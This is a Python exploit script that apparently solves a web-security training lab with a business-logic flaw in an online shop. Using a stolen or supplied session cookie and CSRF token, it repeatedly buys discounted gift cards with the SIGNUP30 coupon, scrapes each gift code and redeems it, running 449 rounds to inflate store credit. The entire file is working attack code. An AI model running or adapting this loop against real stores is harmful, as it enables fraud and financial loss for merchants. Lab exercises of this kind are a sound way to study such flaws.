import requests
import argparse
import re
from bs4 import BeautifulSoup
from termcolor import colored

session = requests.session()

class Gift:
    def __init__(self, url, cookies ,csrf): 
        self.url = url      # Target URL.
        self.cookies = cookies      # Session value in the cookie request. 
        self.csrf_token= csrf       # CSRF token value.

    # Add the gift in the cart.
    def add_gift(self):
        url = self.url + "/cart"
        cookies= {"session": self.cookies}
        data = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
        session.post(url= url,cookies= cookies, data= data)

    # Apply the coupon to take the discount.
    def apply_coupon(self):
        url = self.url + "/cart/coupon"
        cookies= {"session": self.cookies}
        data = {"csrf": self.csrf_token,"coupon": "SIGNUP30"}
        session.post(url, cookies= cookies , data=data)
        
    # place the order and get the gift code.    
    def get_gift_code(self):
        url = self.url + "/cart/checkout"
        cookies= {"session": self.cookies}
        data = {"csrf": self.csrf_token}
        response = session.post(url= url, cookies= cookies,data=data ,allow_redirects= True)
        # I allow the redirects with "True" value to follow the redirection to: /cart/order-confirmation?order-confirmed=true
        page = BeautifulSoup(response.text,"lxml")
        tags = page.find_all("td")
        # print(tags)
        # print(tags[-1])
        gift_code = re.findall(r"[A-Za-z0-9]{10}",str(tags[-1]))
        # print(gift_code[0])    
        return gift_code[0]
    
    # Apply the gift code that we have got to increase the money in the store credit.
    def submit_gift_code(self, gift):            
        url = self.url + "/gift-card"
        cookies= {"session": self.cookies}
        data = {"csrf": self.csrf_token, "gift-card": gift}
        response = session.post(url, cookies= cookies, data=data)
        page = BeautifulSoup(response.text,"lxml")
        tag = page.find_all("strong")
        # print(tag)
        store_credit = str(tag[0]).lstrip("<strong>").rstrip("</strong>")
        print(colored("The gift card code has been submitted...","green"))
        print(colored(store_credit,"red",attrs=['bold']))
        print("________________________________________________")
    
    
def main():
    parser = argparse.ArgumentParser(description='Example: python3 ExploitLogicFlaw.py URL -c "r8Gy0Re1rWhd3oThg5Doe5s3g2LTpmM3" -k "mWrQTthUTmZJAcZN1lhm11hz6OPKc2Y1"')
    parser.add_argument('URL',type= str, help='The target URL')
    parser.add_argument('-c', '--cookies', type= str, help='The session value in the cookie header of the request')
    parser.add_argument('-k', '--csrf-token', type= str, help='CSRF token of the request body')
    args = parser.parse_args() 
    # print(args)
    g = Gift(args.URL, args.cookies, args.csrf_token)
    for i in range(1,450):
        g.add_gift() 
        g.apply_coupon()
        gift = g.get_gift_code()
        print(colored(f"[+] Gift code number {i}: {gift}","cyan"))
        g.submit_gift_code(gift)
        
if __name__ == '__main__':
    main() 
